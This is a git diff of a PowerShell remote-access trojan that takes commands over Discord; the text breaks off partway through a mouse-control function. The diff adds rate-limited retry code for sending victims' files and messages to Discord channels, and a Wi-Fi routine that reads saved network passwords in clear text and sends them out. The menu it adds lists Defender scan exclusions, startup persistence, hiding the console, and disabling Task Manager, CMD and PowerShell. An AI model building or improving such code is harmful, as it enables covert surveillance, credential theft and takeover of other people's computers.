@@ -40,7 +40,7 @@ if ($auto -eq 'n') {
     $defaultstart = 0 
 }
 
-$global:parent = "is.gd/0IyRWT" # parent script URL (for restarts and persistance)
+$global:parent = "is.gd/qv6G96" # parent script URL (for restarts and persistance)
 
 # remove restart stager (if present)
 if (Test-Path "C:\Windows\Tasks\service.vbs") {
@@ -52,6 +52,10 @@ $response = $null
 $previouscmd = $null
 $authenticated = 0
 $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
+
+# Rate limiting global pour Discord (5 requêtes/seconde max)
+$global:lastDiscordRequest = Get-Date
+$global:discordRequestInterval = 0.25  # 250ms entre chaque requête = 4 req/s (sous la limite de 5)
 
 # =============================================================== MODULE FUNCTIONS =========================================================================
 # Download ffmpeg.exe function (dependency for media capture) 
@@ -141,45 +145,316 @@ Function NewChannel {
 function sendMsg {
     param([string]$Message, [string]$Embed, [string]$ChannelID = $SessionID)
 
-    $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("Authorization", "Bot $token")
-
-    if ($Embed) {
-        $jsonBody = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
-        $wc.Headers.Add("Content-Type", "application/json")
-        $response = $wc.UploadString($url, "POST", $jsonBody)
-        if ($webhook) {
-            $body = @{"username" = "Scam BOT" ; "content" = "$jsonBody" } | ConvertTo-Json
-            IRM -Uri $webhook -Method Post -ContentType "application/json" -Body $jsonBody
-        }
-        $jsonPayload = $null
+    if (-not $ChannelID) {
+        Write-Host "Error: ChannelID is not set" -ForegroundColor Red
+        return
     }
-    if ($Message) {
-        $jsonBody = @{
-            "content"  = "$Message"
-            "username" = "$env:computername"
-        } | ConvertTo-Json
+
+    $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
+    
+    # Fonction helper pour respecter le rate limiting global
+    function Wait-ForRateLimit {
+        $elapsed = (Get-Date) - $global:lastDiscordRequest
+        if ($elapsed.TotalSeconds -lt $global:discordRequestInterval) {
+            $waitTime = $global:discordRequestInterval - $elapsed.TotalSeconds
+            Start-Sleep -Milliseconds ([Math]::Ceiling($waitTime * 1000))
+        }
+        $global:lastDiscordRequest = Get-Date
+    }
+    
+    # Fonction helper pour gérer les retries avec rate limiting
+    function Invoke-DiscordRequest {
+        param(
+            [System.Net.WebClient]$client,
+            [string]$url,
+            [string]$body,
+            [int]$maxRetries = 5
+        )
+        
+        for ($retry = 0; $retry -lt $maxRetries; $retry++) {
+            try {
+                # Respecter le rate limiting avant chaque requête
+                Wait-ForRateLimit
+                $response = $client.UploadString($url, "POST", $body)
+                return $true
+            }
+            catch {
+                $statusCode = $null
+                $retryAfter = 1
+                $shouldRetry = $true
+                
+                # Extraire le code d'erreur HTTP depuis l'exception
+                if ($_.Exception -is [System.Net.WebException]) {
+                    $webException = $_.Exception
+                    if ($webException.Response) {
+                        $httpResponse = $webException.Response
+                        $statusCode = [int]$httpResponse.StatusCode
+                        
+                        # Gérer le rate limiting (429)
+                        if ($statusCode -eq 429) {
+                            # Récupérer le header Retry-After
+                            $retryAfterHeader = $httpResponse.Headers["Retry-After"]
+                            if ($retryAfterHeader) {
+                                $retryAfter = [int]$retryAfterHeader + 1  # +1 pour être sûr
+                            }
+                            else {
+                                # Backoff exponentiel si pas de header
+                                $retryAfter = [Math]::Min(60, [Math]::Pow(2, $retry))
+                            }
+                            
+                            Write-Host "Rate limited (429). Waiting $retryAfter seconds before retry $($retry + 1)/$maxRetries..." -ForegroundColor Yellow
+                            Start-Sleep -Seconds $retryAfter
+                            $global:lastDiscordRequest = Get-Date  # Reset après attente
+                            continue
+                        }
+                        # Gérer les erreurs 400 (Bad Request) - NE PAS RETRY
+                        elseif ($statusCode -eq 400) {
+                            try {
+                                $reader = New-Object System.IO.StreamReader($httpResponse.GetResponseStream())
+                                $responseBody = $reader.ReadToEnd()
+                                $reader.Close()
+                                Write-Host "Bad Request (400): $responseBody" -ForegroundColor Yellow
+                            }
+                            catch {
+                                Write-Host "Bad Request (400): Unable to read response body" -ForegroundColor Yellow
+                            }
+                            # Ne pas retry pour les erreurs 400, c'est un problème de format
+                            return $false
+                        }
+                    }
+                }
+                
+                # Vérifier aussi dans le message d'erreur pour détecter 400/429
+                $errorMessage = $_.Exception.Message
+                if ($errorMessage -match "\(400\)") {
+                    Write-Host "Bad Request (400) detected in error message. Not retrying." -ForegroundColor Yellow
+                    return $false
+                }
+                if ($errorMessage -match "\(429\)") {
+                    $retryAfter = [Math]::Min(60, [Math]::Pow(2, $retry))
+                    Write-Host "Rate limited (429) detected. Waiting $retryAfter seconds..." -ForegroundColor Yellow
+                    Start-Sleep -Seconds $retryAfter
+                    $global:lastDiscordRequest = Get-Date
+                    continue
+                }
+                
+                # Pour les autres erreurs, retry avec backoff
+                if ($retry -lt $maxRetries - 1) {
+                    $waitTime = [Math]::Min(10, [Math]::Pow(2, $retry))
+                    Write-Host "Error ($statusCode). Retrying in $waitTime seconds... ($($retry + 1)/$maxRetries)" -ForegroundColor Yellow
+                    Start-Sleep -Seconds $waitTime
+                }
+                else {
+                    Write-Host "Error sending message after $maxRetries retries: $($_.Exception.Message)" -ForegroundColor Red
+                    return $false
+                }
+            }
+        }
+        return $false
+    }
+    
+    try {
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("Authorization", "Bot $token")
         $wc.Headers.Add("Content-Type", "application/json")
-        $response = $wc.UploadString($url, "POST", $jsonBody)
-        $message = $null
+
+        if ($Embed) {
+            if (-not $script:jsonPayload) {
+                Write-Host "Error: jsonPayload is not set for Embed" -ForegroundColor Red
+                return
+            }
+            $jsonBody = $script:jsonPayload | ConvertTo-Json -Depth 10 -Compress
+            Invoke-DiscordRequest -client $wc -url $url -body $jsonBody | Out-Null
+            
+            if ($webhook) {
+                $body = @{"username" = "Scam BOT" ; "content" = "$jsonBody" } | ConvertTo-Json
+                Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $jsonBody -ErrorAction SilentlyContinue
+            }
+            $script:jsonPayload = $null
+        }
+        if ($Message) {
+            # Limiter la taille du message à 2000 caractères (limite Discord)
+            if ($Message.Length -gt 2000) {
+                $Message = $Message.Substring(0, 1997) + "..."
+            }
+            
+            # Nettoyer les caractères de contrôle qui peuvent causer des erreurs 400
+            $Message = $Message -replace "[\x00-\x1F]", ""
+            
+            # S'assurer que le message n'est pas vide après nettoyage
+            if ([string]::IsNullOrWhiteSpace($Message)) {
+                Write-Host "Message is empty after cleaning, skipping send" -ForegroundColor Yellow
+                return
+            }
+            
+            try {
+                $jsonBody = @{
+                    "content" = $Message
+                } | ConvertTo-Json -Compress -ErrorAction Stop
+            }
+            catch {
+                Write-Host "Error converting message to JSON: $($_.Exception.Message)" -ForegroundColor Red
+                Write-Host "Message content: $Message" -ForegroundColor Yellow
+                return
+            }
+            
+            Invoke-DiscordRequest -client $wc -url $url -body $jsonBody | Out-Null
+        }
+    }
+    catch {
+        Write-Host "Critical error in sendMsg: $($_.Exception.Message)" -ForegroundColor Red
+    }
+    finally {
+        if ($wc) {
+            $wc.Dispose()
+        }
     }
 }
 
 function sendFile {
     param([string]$sendfilePath, [string]$ChannelID = $SessionID)
 
-    $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
-    $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("Authorization", "Bot $token")
-    if ($sendfilePath) {
-        if (Test-Path $sendfilePath -PathType Leaf) {
-            $response = $webClient.UploadFile($url, "POST", $sendfilePath)
-            Write-Host "Attachment sent to Discord: $sendfilePath"
+    if (-not $ChannelID) {
+        Write-Host "Error: ChannelID is not set" -ForegroundColor Red
+        return
+    }
+
+    if (-not $sendfilePath) {
+        Write-Host "Error: No file path provided" -ForegroundColor Red
+        return
+    }
+
+    if (-not (Test-Path $sendfilePath -PathType Leaf)) {
+        Write-Host "File not found: $sendfilePath" -ForegroundColor Red
+        sendMsg -Message ":octagonal_sign: ``File not found: $sendfilePath`` :octagonal_sign:" -ChannelID $ChannelID
+        return
+    }
+
+    try {
+        $fileInfo = Get-Item $sendfilePath
+        $maxFileSize = 25MB  # Limite Discord pour les fichiers
+        
+        if ($fileInfo.Length -gt $maxFileSize) {
+            Write-Host "File too large ($([math]::Round($fileInfo.Length/1MB, 2)) MB). Discord limit is 25MB." -ForegroundColor Yellow
+            sendMsg -Message ":octagonal_sign: ``File too large: $($fileInfo.Name) ($([math]::Round($fileInfo.Length/1MB, 2)) MB). Max size: 25MB`` :octagonal_sign:" -ChannelID $ChannelID
+            return
         }
-        else {
-            Write-Host "File not found: $sendfilePath"
+
+        $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
+        $maxRetries = 5
+        
+        # Fonction helper pour respecter le rate limiting
+        function Wait-ForRateLimit {
+            $elapsed = (Get-Date) - $global:lastDiscordRequest
+            if ($elapsed.TotalSeconds -lt $global:discordRequestInterval) {
+                $waitTime = $global:discordRequestInterval - $elapsed.TotalSeconds
+                Start-Sleep -Milliseconds ([Math]::Ceiling($waitTime * 1000))
+            }
+            $global:lastDiscordRequest = Get-Date
         }
+        
+        for ($retry = 0; $retry -lt $maxRetries; $retry++) {
+            $webClient = $null
+            try {
+                # Respecter le rate limiting avant chaque requête
+                Wait-ForRateLimit
+                
+                $webClient = New-Object System.Net.WebClient
+                $webClient.Headers.Add("Authorization", "Bot $token")
+                
+                $response = $webClient.UploadFile($url, "POST", $sendfilePath)
+                Write-Host "Attachment sent to Discord: $sendfilePath" -ForegroundColor Green
+                return
+            }
+            catch {
+                $statusCode = $null
+                $retryAfter = 1
+                $shouldRetry = $true
+                
+                # Extraire le code d'erreur HTTP depuis l'exception
+                if ($_.Exception -is [System.Net.WebException]) {
+                    $webException = $_.Exception
+                    if ($webException.Response) {
+                        $httpResponse = $webException.Response
+                        $statusCode = [int]$httpResponse.StatusCode
+                        
+                        # Gérer le rate limiting (429)
+                        if ($statusCode -eq 429) {
+                            $retryAfterHeader = $httpResponse.Headers["Retry-After"]
+                            if ($retryAfterHeader) {
+                                $retryAfter = [int]$retryAfterHeader + 1  # +1 pour être sûr
+                            }
+                            else {
+                                $retryAfter = [Math]::Min(60, [Math]::Pow(2, $retry))
+                            }
+                            
+                            Write-Host "Rate limited (429) uploading file. Waiting $retryAfter seconds before retry $($retry + 1)/$maxRetries..." -ForegroundColor Yellow
+                            Start-Sleep -Seconds $retryAfter
+                            $global:lastDiscordRequest = Get-Date  # Reset après attente
+                            continue
+                        }
+                        # Erreur 400 - problème de format, NE PAS RETRY
+                        elseif ($statusCode -eq 400) {
+                            try {
+                                $reader = New-Object System.IO.StreamReader($httpResponse.GetResponseStream())
+                                $responseBody = $reader.ReadToEnd()
+                                $reader.Close()
+                                Write-Host "Bad Request (400) uploading file: $responseBody" -ForegroundColor Yellow
+                            }
+                            catch {
+                                Write-Host "Bad Request (400) uploading file: Unable to read response" -ForegroundColor Yellow
+                            }
+                            # Ne pas retry pour les erreurs 400
+                            $fileName = if ($fileInfo -and $fileInfo.Name) { $fileInfo.Name } else { Split-Path -Leaf $sendfilePath }
+                            sendMsg -Message ":octagonal_sign: ``Failed to upload: $fileName - Bad Request (400)`` :octagonal_sign:" -ChannelID $ChannelID
+                            return
+                        }
+                    }
+                }
+                
+                # Vérifier aussi dans le message d'erreur pour détecter 400/429
+                $errorMessage = $_.Exception.Message
+                if ($errorMessage -match "\(400\)") {
+                    Write-Host "Bad Request (400) detected in error message. Not retrying." -ForegroundColor Yellow
+                    $fileName = if ($fileInfo -and $fileInfo.Name) { $fileInfo.Name } else { Split-Path -Leaf $sendfilePath }
+                    sendMsg -Message ":octagonal_sign: ``Failed to upload: $fileName - Bad Request (400)`` :octagonal_sign:" -ChannelID $ChannelID
+                    return
+                }
+                if ($errorMessage -match "\(429\)") {
+                    $retryAfter = [Math]::Min(60, [Math]::Pow(2, $retry))
+                    Write-Host "Rate limited (429) detected. Waiting $retryAfter seconds..." -ForegroundColor Yellow
+                    Start-Sleep -Seconds $retryAfter
+                    $global:lastDiscordRequest = Get-Date
+                    continue
+                }
+                
+                # Pour les autres erreurs, retry avec backoff
+                if ($retry -lt $maxRetries - 1) {
+                    $waitTime = [Math]::Min(10, [Math]::Pow(2, $retry))
+                    $statusDisplay = if ($statusCode) { "$statusCode" } else { "unknown" }
+                    Write-Host "Error uploading file ($statusDisplay). Retrying in $waitTime seconds... ($($retry + 1)/$maxRetries)" -ForegroundColor Yellow
+                    Start-Sleep -Seconds $waitTime
+                }
+                else {
+                    $fileName = if ($fileInfo -and $fileInfo.Name) { $fileInfo.Name } else { Split-Path -Leaf $sendfilePath }
+                    Write-Host "Error uploading file after $maxRetries retries: $($_.Exception.Message)" -ForegroundColor Red
+                    $errorMsg = "Failed to upload: $fileName - $($_.Exception.Message)"
+                    if ($errorMsg.Length -gt 1900) {
+                        $errorMsg = "Failed to upload: $fileName - Error occurred"
+                    }
+                    sendMsg -Message ":octagonal_sign: ``$errorMsg`` :octagonal_sign:" -ChannelID $ChannelID
+                }
+            }
+            finally {
+                if ($webClient) {
+                    $webClient.Dispose()
+                }
+            }
+        }
+    }
+    catch {
+        Write-Host "Critical error in sendFile: $($_.Exception.Message)" -ForegroundColor Red
+        sendMsg -Message ":octagonal_sign: ``Error processing file: $($_.Exception.Message)`` :octagonal_sign:" -ChannelID $ChannelID
     }
 }
 
@@ -261,17 +536,26 @@ Function quickInfo {
 
 # Hide powershell console window function
 function HideWindow {
-    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
-    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
-    $hwnd = (Get-Process -PID $pid).MainWindowHandle
-    if ($hwnd -ne [System.IntPtr]::Zero) {
-        $Type::ShowWindowAsync($hwnd, 0)
+    try {
+        $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+        $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+        $hwnd = (Get-Process -PID $pid).MainWindowHandle
+        if ($hwnd -ne [System.IntPtr]::Zero) {
+            $Type::ShowWindowAsync($hwnd, 0) | Out-Null
+        }
+        else {
+            $Host.UI.RawUI.WindowTitle = 'hideme'
+            Start-Sleep -Milliseconds 100
+            $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' } | Select-Object -First 1)
+            if ($Proc -and $Proc.MainWindowHandle -ne [System.IntPtr]::Zero) {
+                $hwnd = $Proc.MainWindowHandle
+                $Type::ShowWindowAsync($hwnd, 0) | Out-Null
+            }
+        }
     }
-    else {
-        $Host.UI.RawUI.WindowTitle = 'hideme'
-        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
-        $hwnd = $Proc.MainWindowHandle
-        $Type::ShowWindowAsync($hwnd, 0)
+    catch {
+        # Ignorer silencieusement si la fenêtre ne peut pas être masquée
+        Write-Host "Could not hide window: $($_.Exception.Message)" -ForegroundColor Yellow
     }
 }
 
@@ -287,41 +571,54 @@ Function Options {
                 "description" = @"
 
 ### SYSTEM
-- **AddPersistance**: Add this script to startup.
-- **RemovePersistance**: Remove Xeno from startup
+- **AddPersistance**: Add this script to startup (multiple persistence methods)
+- **RemovePersistance**: Remove all persistence methods from startup
 - **IsAdmin**: Check if the session is admin
 - **Elevate**: Attempt to restart script as admin (!user popup!)
-- **ExcludeCDrive**: Exclude C:/ Drive from all Defender Scans
-- **ExcludeAllDrives**: Exclude C:/ - G:/ Drives from Defender Scans
+- **ExcludeCDrive**: Exclude C:/ Drive from all Defender Scans (admin only)
+- **ExcludeAllDrives**: Exclude C:/ - G:/ Drives from Defender Scans (admin only)
 - **EnableIO**: Enable Keyboard and Mouse (admin only)
 - **DisableIO**: Disable Keyboard and Mouse (admin only)
+- **DisableTaskManager**: Disable Task Manager (admin only)
+- **EnableTaskManager**: Enable Task Manager (admin only)
+- **DisableCMD**: Disable Command Prompt (admin only)
+- **EnableCMD**: Enable Command Prompt (admin only)
+- **DisablePowerShell**: Disable PowerShell (admin only)
+- **EnablePowerShell**: Enable PowerShell (admin only)
+- **OpenURL**: Open a URL in default browser (OpenURL -Url http://example.com)
+- **BlockURL**: Block a URL via hosts file (admin only, BlockURL -Url example.com)
+- **UnblockURL**: Unblock a URL from hosts file (admin only, UnblockURL -Url example.com)
 - **Exfiltrate**: Send various files. (see ExtraInfo)
-- **Upload**: Upload a file. (see ExtraInfo)
-- **Download**: Download a file. (attach a file with the command)
-- **StartUvnc**: Start UVNC client `StartUvnc -ip 192.168.1.1 -port 8080`
-- **SpeechToText**: Send audio transcript to Discord
-- **EnumerateLAN**: Show devices on LAN (see ExtraInfo)
-- **NearbyWifi**: Show nearby wifi networks (!user popup!)
+- **Upload**: Upload a file to target. (see ExtraInfo)
+- **StartUvnc**: Start UVNC client (use: ``StartUvnc -ip 192.168.1.1 -port 8080``)
+- **SpeechToText**: Send audio transcript to Discord (use kill command to stop)
+- **TextToSpeech**: Convert text to speech (usage: TextToSpeech -Text "your message")
+- **EnumerateLAN**: Show devices on LAN and send to Discord (see ExtraInfo)
+- **NearbyWifi**: Show nearby WiFi networks and send to Discord (opens network selection window briefly)
+- **GetMousePosition**: Get current mouse cursor position (X, Y)
+- **MoveMouse**: Move mouse cursor to coordinates (usage: MoveMouse -X 100 -Y 200)
+- **MouseClick**: Perform mouse click (usage: MouseClick -Button left|right)
+- **TypeText**: Type text using keyboard (usage: TypeText -Text "your text")
 - **RecordScreen**: Record Screen and send to Discord
 - **TakePhoto**: Take a single photo from camera (manual capture)
 - **TakeScreenshot**: Capture a single screenshot (manual capture)
 - **RecordAudioClip**: Record audio clip of specified duration (manual capture, use: RecordAudioClip 30)
 
 ### PRANKS
-- **FakeUpdate**: Spoof Windows-10 update screen using Chrome
-- **Windows93**: Start parody Windows93 using Chrome
-- **WindowsIdiot**: Start fake Windows95 using Chrome
-- **SendHydra**: Never ending popups (use killswitch) to stop
-- **SoundSpam**: Play all Windows default sounds on the target
+- **FakeUpdate**: Simulate Windows 10 update screen using Chrome (use StopFakeUpdate to close)
+- **Windows93**: Launch Windows93 parody using Chrome (use StopWindows93 to close)
+- **WindowsIdiot**: Start fake Windows95 using Chrome (use StopWindowsIdiot to close)
+- **SendHydra**: Endless popups (use StopHydra to stop)
+- **SoundSpam**: Play all Windows default sounds (use StopSoundSpam to stop)
 - **Message**: Send a message window to the User (!user popup!)
-- **VoiceMessage**: Send a message window to the User (!user popup!)
-- **MinimizeAll**: Send a voice message to the User
-- **EnableDarkMode**: Enable System wide Dark Mode
-- **DisableDarkMode**: Disable System wide Dark Mode
-- **ShortcutBomb**: Create 50 shortcuts on the desktop.
-- **Wallpaper**: Set the wallpaper (wallpaper -url http://img.com/f4wc)
-- **Goose**: Spawn an annoying goose (Sam Pearson App)
-- **ScreenParty**: Start A Disco on screen!
+- **VoiceMessage**: Send a voice message to the User (!user popup!)
+- **MinimizeAll**: Minimize all windows
+- **EnableDarkMode**: Enable system-wide Dark Mode
+- **DisableDarkMode**: Disable system-wide Dark Mode
+- **ShortcutBomb**: Create 50 shortcuts on the desktop
+- **Wallpaper**: Set the wallpaper (Wallpaper -url http://img.com/f4wc)
+- **Goose**: Spawn an annoying goose (Sam Pearson App) (use StopGoose to stop)
+- **ScreenParty**: Start a disco on screen! (use StopScreenParty to stop early)
 
 ### JOBS
 - **Microphone**: Record microphone clips and send to Discord (AUTOMATIC CAPTURE DISABLED - Use RecordAudioClip instead)
@@ -369,9 +666,8 @@ from all User Folders like Documents, Downloads etc..
 > PS> ``Upload -Path C:/Path/To/File.txt``
 Use 'FolderTree' command to show all files
 
-**Enumerate-LAN Example:**
-> PS> ``EnumerateLAN -Prefix 192.168.1.``
-This Eg. will scan 192.168.1.1 to 192.168.1.254
+**Enumerate-LAN:**
+Automatically detects local subnet and scans all devices (192.168.x.1 to 192.168.x.254). Results are sent to Discord.
 
 **Prank Examples:**
 > PS> ``Message 'Your Message Here!'``
@@ -418,53 +714,310 @@ Function CleanUp {
 
 # --------------------------------------------------------------- INFO FUNCTIONS ------------------------------------------------------------------------
 Function EnumerateLAN {
-    sendMsg -Message ":hourglass: Searching Network Devices - please wait.. :hourglass:"
-    $localIP = (Get-NetIPAddress -AddressFamily IPv4 | 
-        Where-Object SuffixOrigin -eq "Dhcp" | 
-        Select-Object -ExpandProperty IPAddress)
-    
-    if ($localIP -match '^(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}$') {
-        $subnet = $matches[1]
-        1..254 | ForEach-Object {
-            Start-Process -WindowStyle Hidden ping.exe -ArgumentList "-n 1 -l 0 -f -i 2 -w 100 -4 $subnet.$_"
-        }    
-        sleep 1
-        $IPDevices = (arp.exe -a | Select-String "$subnet.*dynam") -replace ' +', ',' | ConvertFrom-Csv -Header Computername, IPv4, MAC | Where-Object { $_.MAC -ne 'dynamic' } | Select-Object IPv4, MAC, Computername
-        $IPDevices | ForEach-Object {
-            try {
-                $ip = $_.IPv4
-                $hostname = ([System.Net.Dns]::GetHostEntry($ip)).HostName
-                $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value $hostname -Force
+    try {
+        sendMsg -Message ":hourglass: Searching Network Devices - please wait.. :hourglass:"
+        $localIP = (Get-NetIPAddress -AddressFamily IPv4 | 
+            Where-Object SuffixOrigin -eq "Dhcp" | 
+            Select-Object -ExpandProperty IPAddress)
+        
+        if ($localIP -match '^(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}$') {
+            $subnet = $matches[1]
+            1..254 | ForEach-Object {
+                Start-Process -WindowStyle Hidden ping.exe -ArgumentList "-n 1 -l 0 -f -i 2 -w 100 -4 $subnet.$_"
+            }    
+            sleep 2
+            $IPDevices = (arp.exe -a | Select-String "$subnet.*dynam") -replace ' +', ',' | ConvertFrom-Csv -Header Computername, IPv4, MAC | Where-Object { $_.MAC -ne 'dynamic' } | Select-Object IPv4, MAC, Computername
+            
+            $IPDevices | ForEach-Object {
+                try {
+                    $ip = $_.IPv4
+                    $hostname = ([System.Net.Dns]::GetHostEntry($ip)).HostName
+                    $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value $hostname -Force
+                }
+                catch {
+                    $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value "N/A" -Force
+                }
             }
-            catch {
-                $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value "N/A" -Force
+            
+            # Formater proprement pour Discord (sans Format-Table qui cause des problèmes)
+            if ($IPDevices -and $IPDevices.Count -gt 0) {
+                $output = ":white_check_mark: **Network Devices Found:**`n`n"
+                $output += "IPv4 | Hostname | MAC`n"
+                $output += "--- | --- | ---`n"
+                
+                foreach ($device in $IPDevices) {
+                    $hostname = if ($device.Hostname -and $device.Hostname -ne "N/A") { $device.Hostname } else { "N/A" }
+                    $output += "$($device.IPv4) | $hostname | $($device.MAC)`n"
+                }
+                
+                # Limiter la taille pour éviter erreurs 400
+                if ($output.Length -gt 1900) {
+                    $output = ":white_check_mark: **Network Devices Found:** ($($IPDevices.Count) devices)`n`n"
+                    $output += "IPv4 | Hostname | MAC`n"
+                    $output += "--- | --- | ---`n"
+                    foreach ($device in $IPDevices[0..9]) {
+                        $hostname = if ($device.Hostname -and $device.Hostname -ne "N/A") { $device.Hostname } else { "N/A" }
+                        $output += "$($device.IPv4) | $hostname | $($device.MAC)`n"
+                    }
+                    if ($IPDevices.Count -gt 10) {
+                        $output += "... and $($IPDevices.Count - 10) more device(s)"
+                    }
+                }
+                
+                sendMsg -Message "``$output``"
+            }
+            else {
+                sendMsg -Message ":octagonal_sign: ``No network devices found on subnet $subnet.0/24`` :octagonal_sign:"
             }
         }
-        $IPDevices | Format-Table -Property IPv4, Hostname, MAC -AutoSize
-        $IPDevices = ($IPDevices | Out-String)
+        else {
+            sendMsg -Message ":octagonal_sign: ``Could not detect local IP address or subnet`` :octagonal_sign:"
+        }
     }
-    sendMsg -Message "``````$IPDevices``````"
+    catch {
+        sendMsg -Message ":octagonal_sign: ``Error enumerating LAN: $($_.Exception.Message)`` :octagonal_sign:"
+    }
 }
 
 Function NearbyWifi {
-    $showNetworks = explorer.exe ms-availablenetworks:
-    sleep 4
-    $wshell = New-Object -ComObject wscript.shell
-    $wshell.AppActivate('explorer.exe')
-    $tab = 0
-    while ($tab -lt 6) {
-        $wshell.SendKeys('{TAB}')
-        sleep -m 100
-        $tab++
+    try {
+        sendMsg -Message ":hourglass: Scanning nearby WiFi networks - please wait.. :hourglass:"
+        
+        # Ouvrir la fenêtre de sélection réseau (optionnel, peut être commenté si non nécessaire)
+        try {
+            $showNetworks = explorer.exe ms-availablenetworks: 2>$null
+            sleep 2
+            $wshell = New-Object -ComObject wscript.shell -ErrorAction SilentlyContinue
+            if ($wshell) {
+                $wshell.AppActivate('explorer.exe') 2>$null
+                Start-Sleep -Milliseconds 500
+                $wshell.SendKeys('{ESC}') 2>$null
+                Start-Sleep -Milliseconds 200
+            }
+        }
+        catch {
+            # Ignorer les erreurs de la fenêtre popup
+        }
+        
+        # Obtenir les réseaux WiFi
+        $wifiOutput = netsh wlan show networks mode=Bssid 2>$null
+        if (-not $wifiOutput) {
+            sendMsg -Message ":octagonal_sign: ``No WiFi networks found or WiFi adapter not available`` :octagonal_sign:"
+            return
+        }
+        
+        # Parser les réseaux WiFi
+        $networks = @()
+        $currentNetwork = $null
+        
+        foreach ($line in $wifiOutput) {
+            if ($line -match '^SSID\s+\d+\s*:\s*(.+)$') {
+                if ($currentNetwork) {
+                    $networks += $currentNetwork
+                }
+                $currentNetwork = [PSCustomObject]@{
+                    SSID = $matches[1].Trim()
+                    Signal = 0  # Initialiser à 0 pour le tri numérique
+                    Band = "N/A"
+                    Security = "N/A"
+                }
+            }
+            elseif ($currentNetwork) {
+                if ($line -match 'Signal\s*:\s*(\d+)%') {
+                    $currentNetwork.Signal = [int]$matches[1]  # Stocker comme nombre pour le tri
+                }
+                elseif ($line -match 'Radio type\s*:\s*(.+)$') {
+                    $currentNetwork.Band = $matches[1].Trim()
+                }
+                elseif ($line -match 'Authentication\s*:\s*(.+)$') {
+                    $currentNetwork.Security = $matches[1].Trim()
+                }
+            }
+        }
+        
+        if ($currentNetwork) {
+            $networks += $currentNetwork
+        }
+        
+        # Obtenir les mots de passe des réseaux WiFi enregistrés
+        $savedProfiles = @{}
+        try {
+            $wifiProfiles = netsh wlan show profiles 2>$null | Select-String "All User Profile"
+            if ($wifiProfiles) {
+                foreach ($profile in $wifiProfiles) {
+                    $profileName = ($profile -split ":")[1].Trim()
+                    $passwordOutput = netsh wlan show profile name="$profileName" key=clear 2>$null | Select-String "Key Content"
+                    if ($passwordOutput) {
+                        $password = ($passwordOutput -split ":")[1].Trim()
+                        $savedProfiles[$profileName] = $password
+                    }
+                    else {
+                        $savedProfiles[$profileName] = "No password"
+                    }
+                }
+            }
+        }
+        catch {
+            # Ignorer les erreurs
+        }
+        
+        # Formater proprement pour Discord en liste
+        if ($networks -and $networks.Count -gt 0) {
+            # Trier par signal décroissant
+            $networks = $networks | Sort-Object -Property Signal -Descending
+            
+            $output = ":white_check_mark: **Nearby WiFi Networks:** ($($networks.Count) found)" + [Environment]::NewLine + [Environment]::NewLine
+            
+            $counter = 1
+            foreach ($network in $networks) {
+                $ssid = $network.SSID
+                $signal = if ($network.Signal -gt 0) { "$($network.Signal)%" } else { "N/A" }
+                $band = if ($network.Band -ne "N/A") { $network.Band } else { "N/A" }
+                $security = if ($network.Security -ne "N/A") { $network.Security } else { "N/A" }
+                
+                # Chercher le mot de passe si le réseau est enregistré
+                $password = "Not saved"
+                if ($savedProfiles.ContainsKey($ssid)) {
+                    $password = $savedProfiles[$ssid]
+                }
+                
+                $output += "$counter. **$ssid**" + [Environment]::NewLine
+                $output += "   - Signal: $signal" + [Environment]::NewLine
+                $output += "   - Band: $band" + [Environment]::NewLine
+                $output += "   - Security: $security" + [Environment]::NewLine
+                $output += "   - Password: $password" + [Environment]::NewLine
+                $output += [Environment]::NewLine
+                
+                $counter++
+                
+                # Limiter à 20 réseaux pour éviter les erreurs 400
+                if ($counter -gt 20) {
+                    if ($networks.Count -gt 20) {
+                        $output += "... and $($networks.Count - 20) more network(s)" + [Environment]::NewLine
+                    }
+                    break
+                }
+            }
+            
+            sendMsg -Message $output
+        }
+        else {
+            sendMsg -Message ":octagonal_sign: ``No WiFi networks found`` :octagonal_sign:"
+        }
     }
-    $wshell.SendKeys('{ENTER}')
-    sleep -m 200
-    $wshell.SendKeys('{TAB}')
-    sleep -m 200
-    $wshell.SendKeys('{ESC}')
-    $NearbyWifi = (netsh wlan show networks mode=Bssid | ? { $_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*" }).trim() | Format-Table SSID, Signal, Band
-    $Wifi = ($NearbyWifi | Out-String)
-    sendMsg -Message "``````$Wifi``````"
+    catch {
+        sendMsg -Message ":octagonal_sign: ``Error scanning WiFi networks: $($_.Exception.Message)`` :octagonal_sign:"
+    }
+}
+
+# --------------------------------------------------------------- MOUSE & KEYBOARD CONTROL FUNCTIONS ------------------------------------------------------------------------
+
+Function GetMousePosition {
+    try {
+        Add-Type -TypeDefinition @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class MousePosition {
+            [DllImport("user32.dll")]
+            public static extern bool GetCursorPos(out POINT lpPoint);
+            
+            [StructLayout(LayoutKind.Sequential)]
+            public struct POINT {
+                public int X;
+                public int Y;
+            }
+        }
+"@
+        $point = New-Object MousePosition+POINT
+        [MousePosition]::GetCursorPos([ref]$point) | Out-Null
+        sendMsg -Message ":mouse: ``Mouse Position: X=$($point.X), Y=$($point.Y)`` :mouse:"
+    }
+    catch {
